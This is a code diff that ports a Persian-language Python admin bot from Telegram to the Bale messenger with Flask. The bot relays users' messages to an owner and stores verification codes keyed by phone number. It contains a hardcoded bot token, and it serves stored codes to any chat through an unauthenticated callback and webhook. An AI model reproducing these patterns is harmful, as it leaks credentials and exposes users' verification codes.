@@ -1,15 +1,17 @@
-import telebot
+from flask import Flask, request, jsonify
+from threading import Thread
+import requests
+import json
 import time
-import threading
 import sqlite3
 from datetime import datetime, timedelta
 
-# توکن ربات
+# تنظیمات ربات بله
 BOT_TOKEN = "223436980:DgvOTxkcPkrDmEk6Y4qefsQ30MuitGIwvbQ"
 OWNER_ID = 1828182856
+API_URL = f"https://tapi.bale.ai/bot{BOT_TOKEN}"
 
-# راه‌اندازی ربات
-bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
 # راه‌اندازی دیتابیس
 conn = sqlite3.connect('bot_data.db', check_same_thread=False)
@@ -25,240 +27,226 @@ CREATE TABLE IF NOT EXISTS users (
 ''')
 
 cursor.execute('''
-CREATE TABLE IF NOT EXISTS banned (
+CREATE TABLE IF NOT EXISTS pending_codes (
     phone TEXT PRIMARY KEY,
-    ban_until TEXT
-)
-''')
-
-cursor.execute('''
-CREATE TABLE IF NOT EXISTS messages (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    phone TEXT,
-    message TEXT,
+    code TEXT,
     time TEXT
 )
 ''')
 
 conn.commit()
 
-# ========== دستورات ==========
+def send_message(chat_id, text):
+    """ارسال پیام به کاربر در بله"""
+    try:
+        url = f"{API_URL}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": text
+        }
+        response = requests.post(url, json=payload)
+        return response.json()
+    except Exception as e:
+        print(f"خطا در ارسال پیام: {e}")
+        return None
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    if message.chat.id == OWNER_ID:
-        bot.reply_to(message, "💀 ربات مدیریت پنل فعال شد 💀\n\n📋 دستورات:\n/send [شماره] [کد] - ارسال کد\n/msg [شماره] [متن] - ارسال پیام\n/users - لیست کاربران\n/banned - لیست بن‌ها\n/ban [شماره] - بن کردن\n/unban [شماره] - رفع بن\n/stats - آمار\n/help - راهنما")
+def send_callback(chat_id, text, callback_data):
+    """ارسال پیام با دکمه شیشه‌ای"""
+    try:
+        url = f"{API_URL}/sendMessage"
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": text, "callback_data": callback_data}
+                ]
+            ]
+        }
+        payload = {
+            "chat_id": chat_id,
+            "text": "لطفاً انتخاب کنید:",
+            "reply_markup": keyboard
+        }
+        response = requests.post(url, json=payload)
+        return response.json()
+    except Exception as e:
+        print(f"خطا: {e}")
+        return None
 
-@bot.message_handler(commands=['help'])
-def help_command(message):
-    if message.chat.id == OWNER_ID:
+def get_updates(offset=None):
+    """دریافت پیام‌های جدید"""
+    try:
+        url = f"{API_URL}/getUpdates"
+        params = {}
+        if offset:
+            params["offset"] = offset
+        response = requests.get(url, params=params)
+        return response.json()
+    except Exception as e:
+        print(f"خطا در دریافت آپدیت: {e}")
+        return None
+
+def save_pending_code(phone, code):
+    """ذخیره کد در انتظار برای کاربر"""
+    cursor.execute("INSERT OR REPLACE INTO pending_codes (phone, code, time) VALUES (?, ?, ?)",
+                   (phone, code, datetime.now().isoformat()))
+    conn.commit()
+
+def get_pending_code(phone):
+    """دریافت کد ذخیره شده برای کاربر"""
+    cursor.execute("SELECT code FROM pending_codes WHERE phone = ?", (phone,))
+    result = cursor.fetchone()
+    if result:
+        return result[0]
+    return None
+
+def delete_pending_code(phone):
+    """حذف کد بعد از استفاده"""
+    cursor.execute("DELETE FROM pending_codes WHERE phone = ?", (phone,))
+    conn.commit()
+
+# ========== پردازش دستورات ==========
+
+def process_command(chat_id, text):
+    if chat_id != OWNER_ID:
+        # پیام از کاربر عادی
+        send_message(OWNER_ID, f"💬 پیام از کاربر {chat_id}:\n{text}")
+        send_message(chat_id, "✅ پیام شما به پشتیبان ارسال شد")
+        return
+    
+    # دستورات ادمین
+    if text == "/start":
         help_text = """
-💀 راهنمای ربات مدیریت 💀
-━━━━━━━━━━━━━━━━━━━━
+💀 ربات مدیریت پنل فعال شد 💀
+
+📋 دستورات:
 /send [شماره] [کد] - ارسال کد تایید
-/msg [شماره] [متن] - ارسال پیام به کاربر
-/users - نمایش لیست کاربران تایید شده
-/banned - نمایش لیست بن‌ها
-/ban [شماره] - بن کردن کاربر
-/unban [شماره] - رفع بن کاربر
-/stats - آمار کلی
-/clear - پاک کردن همه داده‌ها
-━━━━━━━━━━━━━━━━━━━━
+/users - لیست کاربران
+/help - راهنما
         """
-        bot.reply_to(message, help_text)
-
-@bot.message_handler(commands=['send'])
-def send_code(message):
-    if message.chat.id != OWNER_ID:
-        return
+        send_message(chat_id, help_text)
     
-    try:
-        parts = message.text.split()
-        if len(parts) < 3:
-            bot.reply_to(message, "❌ فرمت صحیح:\n/send 09123456789 123456")
+    elif text.startswith("/send"):
+        try:
+            parts = text.split()
+            if len(parts) < 3:
+                send_message(chat_id, "❌ فرمت صحیح:\n/send 09123456789 123456")
+                return
+            
+            phone = parts[1]
+            code = parts[2]
+            
+            # ذخیره کد
+            save_pending_code(phone, code)
+            send_message(chat_id, f"✅ کد {code} برای شماره {phone} ذخیره شد")
+            
+        except Exception as e:
+            send_message(chat_id, f"❌ خطا: {str(e)}")
+    
+    elif text == "/users":
+        cursor.execute("SELECT phone, verified FROM users")
+        users = cursor.fetchall()
+        if not users:
+            send_message(chat_id, "📭 هیچ کاربری ثبت نشده")
             return
-        
-        phone = parts[1]
-        code = parts[2]
-        
-        if not phone.startswith('09') or len(phone) != 11:
-            bot.reply_to(message, "❌ شماره نامعتبر است")
-            return
-        
-        if len(code) != 6 or not code.isdigit():
-            bot.reply_to(message, "❌ کد باید 6 رقم باشد")
-            return
-        
-        # ذخیره کد در دیتابیس
-        cursor.execute("INSERT OR REPLACE INTO users (phone, code, request_time) VALUES (?, ?, ?)", 
-                       (phone, code, datetime.now().isoformat()))
+        msg = "👥 لیست کاربران:\n━━━━━━━━━━━━━━━━━━━━\n"
+        for user in users:
+            status = "✅ تایید" if user[1] else "⏳ در انتظار"
+            msg += f"📱 {user[0]} - {status}\n"
+        send_message(chat_id, msg)
+    
+    elif text == "/help":
+        help_text = """
+📟 راهنمای ربات مدیریت
+
+/send [شماره] [کد] - ارسال کد تایید
+/users - نمایش کاربران
+/clear - پاک کردن همه داده‌ها
+        """
+        send_message(chat_id, help_text)
+    
+    elif text == "/clear":
+        cursor.execute("DELETE FROM users")
+        cursor.execute("DELETE FROM pending_codes")
         conn.commit()
-        
-        bot.reply_to(message, f"✅ کد {code} برای شماره {phone} ارسال شد")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطا: {str(e)}")
+        send_message(chat_id, "✅ همه داده‌ها پاک شد")
 
-@bot.message_handler(commands=['msg'])
-def send_message_to_user(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    try:
-        parts = message.text.split()
-        if len(parts) < 3:
-            bot.reply_to(message, "❌ فرمت صحیح:\n/msg 09123456789 متن پیام")
-            return
-        
-        phone = parts[1]
-        msg_text = ' '.join(parts[2:])
-        
-        # ذخیره پیام برای کاربر
-        cursor.execute("INSERT INTO messages (phone, message, time) VALUES (?, ?, ?)",
-                       (phone, msg_text, datetime.now().isoformat()))
-        conn.commit()
-        
-        bot.reply_to(message, f"✅ پیام به {phone} ارسال شد: {msg_text}")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطا: {str(e)}")
+def process_callback(chat_id, data):
+    """پردازش کلیک روی دکمه شیشه‌ای"""
+    if data.startswith("verify_"):
+        phone = data.replace("verify_", "")
+        code = get_pending_code(phone)
+        if code:
+            # در اینجا میتونی کد رو به کاربر نمایش بدی
+            send_message(chat_id, f"🔑 کد تایید برای {phone}: {code}")
+        else:
+            send_message(chat_id, f"❌ کدی برای {phone} یافت نشد")
 
-@bot.message_handler(commands=['users'])
-def list_users(message):
-    if message.chat.id != OWNER_ID:
-        return
+def run_bot():
+    """حلقه اصلی ربات"""
+    last_update_id = 0
+    print("🤖 ربات بله روشن شد...")
     
-    cursor.execute("SELECT phone, verified FROM users")
-    users = cursor.fetchall()
-    
-    if not users:
-        bot.reply_to(message, "📭 هیچ کاربری ثبت نشده")
-        return
-    
-    text = "👥 لیست کاربران:\n━━━━━━━━━━━━━━━━━━━━\n"
-    for user in users:
-        status = "✅ تایید شده" if user[1] else "⏳ در انتظار"
-        text += f"📱 {user[0]} - {status}\n"
-    
-    bot.reply_to(message, text)
-
-@bot.message_handler(commands=['banned'])
-def list_banned(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    cursor.execute("SELECT phone, ban_until FROM banned")
-    banned = cursor.fetchall()
-    
-    if not banned:
-        bot.reply_to(message, "🚫 هیچ کاربری بن نیست")
-        return
-    
-    text = "🚫 لیست بن‌ها:\n━━━━━━━━━━━━━━━━━━━━\n"
-    for ban in banned:
-        text += f"📱 {ban[0]} - تا {ban[1]}\n"
-    
-    bot.reply_to(message, text)
-
-@bot.message_handler(commands=['ban'])
-def ban_user(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ فرمت صحیح:\n/ban 09123456789")
-            return
-        
-        phone = parts[1]
-        ban_until = (datetime.now() + timedelta(days=30)).isoformat()
-        
-        cursor.execute("INSERT OR REPLACE INTO banned (phone, ban_until) VALUES (?, ?)", (phone, ban_until))
-        conn.commit()
-        
-        bot.reply_to(message, f"✅ کاربر {phone} به مدت 30 روز بن شد")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطا: {str(e)}")
-
-@bot.message_handler(commands=['unban'])
-def unban_user(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ فرمت صحیح:\n/unban 09123456789")
-            return
-        
-        phone = parts[1]
-        
-        cursor.execute("DELETE FROM banned WHERE phone = ?", (phone,))
-        conn.commit()
-        
-        bot.reply_to(message, f"✅ بن کاربر {phone} لغو شد")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطا: {str(e)}")
-
-@bot.message_handler(commands=['stats'])
-def show_stats(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    cursor.execute("SELECT COUNT(*) FROM users")
-    user_count = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM banned")
-    banned_count = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM messages")
-    msg_count = cursor.fetchone()[0]
-    
-    text = f"""
-📊 آمار ربات
-━━━━━━━━━━━━━━━━━━━━
-👥 کاربران: {user_count}
-🚫 بن شده: {banned_count}
-💬 پیام‌ها: {msg_count}
-🕐 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-━━━━━━━━━━━━━━━━━━━━
-    """
-    bot.reply_to(message, text)
-
-@bot.message_handler(commands=['clear'])
-def clear_data(message):
-    if message.chat.id != OWNER_ID:
-        return
-    
-    cursor.execute("DELETE FROM users")
-    cursor.execute("DELETE FROM messages")
-    conn.commit()
-    
-    bot.reply_to(message, "✅ همه داده‌ها پاک شد")
-
-# ========== دریافت پیامک از سایت ==========
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    if message.chat.id == OWNER_ID:
-        return
-    
-    # ذخیره پیام کاربر
-    cursor.execute("INSERT INTO messages (phone, message, time) VALUES (?, ?, ?)",
-                   (str(message.chat.id), message.text, datetime.now().isoformat()))
-    conn.commit()
-    
-    # ارسال به ادمین
-    bot.send_message(OWNER_ID, f"💬 پیام از کاربر:\n📱 {message.chat.id}\n📝 {message.text}")
-
-# ========== راه‌اندازی ==========
-if __name__ == '__main__':
-    print("🤖 ربات روشن شد...")
     while True:
         try:
-            bot.polling(timeout=60)
+            response = get_updates(last_update_id + 1)
+            
+            if response and response.get("ok"):
+                for update in response.get("result", []):
+                    update_id = update.get("update_id")
+                    if update_id:
+                        last_update_id = update_id
+                    
+                    # پیام متنی
+                    if "message" in update:
+                        msg = update["message"]
+                        chat_id = msg["chat"]["id"]
+                        if "text" in msg:
+                            process_command(chat_id, msg["text"])
+                    
+                    # کلیک روی دکمه
+                    if "callback_query" in update:
+                        cb = update["callback_query"]
+                        chat_id = cb["message"]["chat"]["id"]
+                        data = cb.get("data", "")
+                        process_callback(chat_id, data)
+                        
+                        # پاسخ به callback
+                        try:
+                            answer_url = f"{API_URL}/answerCallbackQuery"
+                            requests.post(answer_url, json={"callback_query_id": cb["id"]})
+                        except:
+                            pass
+            
+            time.sleep(1)
+            
         except Exception as e:
-            print(f"خطا: {e}")
-            time.sleep(10)
+            print(f"خطا در حلقه اصلی: {e}")
+            time.sleep(5)
+
+# ========== روت Flask برای نگه داشتن ربات در Render ==========
+@app.route('/')
+def home():
+    return "ربات بله فعال است!"
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    data = request.json
+    if data:
+        if "message" in data:
+            chat_id = data["message"]["chat"]["id"]
+            if "text" in data["message"]:
+                process_command(chat_id, data["message"]["text"])
+        if "callback_query" in data:
+            chat_id = data["callback_query"]["message"]["chat"]["id"]
+            data_cb = data["callback_query"].get("data", "")
+            process_callback(chat_id, data_cb)
+    return jsonify({"status": "ok"})
+
+if __name__ == "__main__":
+    # اجرای ربات در یک ترد جداگانه
+    bot_thread = Thread(target=run_bot)
+    bot_thread.start()
+    
+    # اجرای فلاسک برای جلوگیری از خاموش شدن
+    port = 5000
+    app.run(host='0.0.0.0', port=port)
